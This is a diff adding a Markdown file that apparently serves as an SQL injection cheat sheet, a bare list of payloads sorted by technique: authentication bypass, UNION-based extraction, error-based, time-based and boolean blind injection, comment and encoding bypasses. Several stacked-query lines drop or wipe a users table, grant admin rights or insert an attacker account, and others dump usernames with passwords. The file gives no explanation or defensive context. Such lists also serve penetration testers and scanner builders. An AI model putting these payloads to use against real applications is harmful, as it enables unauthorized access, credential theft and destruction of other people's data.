@@ -1,0 +1,90 @@
+# SQL Injection Payloads
+
+## Authentication Bypass
+admin' --
+admin' #
+admin'/*
+' or '1'='1
+' or 1=1 --
+' or 1=1 #
+' or 1=1/*
+') or '1'='1
+') or ('1'='1
+admin' or '1'='1
+' or 'a'='a
+' or 'x'='x
+" or ""="
+" or "x"="x
+" or 1=1 --
+" or 1=1 #
+1' UNION SELECT NULL --
+1' UNION SELECT NULL, NULL --
+1' UNION SELECT NULL, NULL, NULL --
+
+## UNION-based SQLi
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT database() --
+' UNION SELECT user() --
+' UNION SELECT version() --
+' UNION SELECT @@version --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns --
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables --
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --
+
+## Error-based SQLi
+extractvalue(rand(),concat(0x3a,(SELECT version())))
+extractvalue(rand(),concat(0x3a,(SELECT user())))
+extractvalue(rand(),concat(0x3a,(SELECT database())))
+updatexml(rand(),concat(0x3a,(SELECT version())),1)
+updatexml(rand(),concat(0x3a,(SELECT user())),1)
+
+## Time-based Blind SQLi
+' AND SLEEP(5) --
+' AND SLEEP(5) #
+' OR SLEEP(5) --
+' OR SLEEP(5) #
+'; WAITFOR DELAY '00:00:05' --
+'; WAITFOR DELAY '00:00:05' #
+" AND SLEEP(5) --
+" AND SLEEP(5) #
+" OR SLEEP(5) --
+" OR SLEEP(5) #
+
+## Boolean-based Blind SQLi
+' AND 1=1 --
+' AND 1=2 --
+' AND 'a'='a' --
+' AND 'a'='b' --
+') AND 1=1 --
+') AND 1=2 --
+" AND 1=1 --
+" AND 1=2 --
+
+## Stacked Queries
+'; DROP TABLE users; --
+'; UPDATE users SET admin=1; --
+'; DELETE FROM users; --
+'; INSERT INTO users VALUES('hacker', 'password'); --
+
+## Comment Bypass
+' or 1=1 --
+' or 1=1 #
+' or 1=1 /*
+' or 1=1 */
+' or 1=1 \\
+' or 1=1 ;
+' or 1=1 and '
+' or 1=1 xor '
+
+## String Concatenation
+' UNION SELECT CONCAT(user, ':', password) FROM users --
+' UNION SELECT GROUP_CONCAT(user, ':', password) FROM users --
+
+## Encoding Bypasses
+%27 or 1=1 --
+%27 or %271%27=%271
+' /*!50000or*/ 1=1 --
+' %4f%52 1=1 --
